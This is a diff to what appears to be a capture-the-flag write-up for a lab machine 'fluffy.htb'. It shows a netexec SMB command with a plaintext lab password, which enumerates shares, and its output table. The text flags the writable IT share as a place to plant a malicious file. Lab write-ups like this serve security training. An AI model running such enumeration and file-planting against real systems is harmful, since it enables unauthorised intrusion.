@@ -76,8 +76,16 @@ Using the provided credentials for `j.fleischman`, the available shares were enu
 ```bash
 netexec smb 10.129.20.210 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
 ```
-> [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!  
-> IT READ,WRITE
+```bash
+Share        Permissions    Remark
+-----        -----------    ------
+ADMIN$                      Remote Admin
+C$                          Default share
+IPC$         READ           Remote IPC
+IT           READ,WRITE
+NETLOGON     READ           Logon server share
+SYSVOL       READ           Logon server share
+```
 
 The **IT** share is both readable and writable, which is a critical finding for planting a malicious file.
 
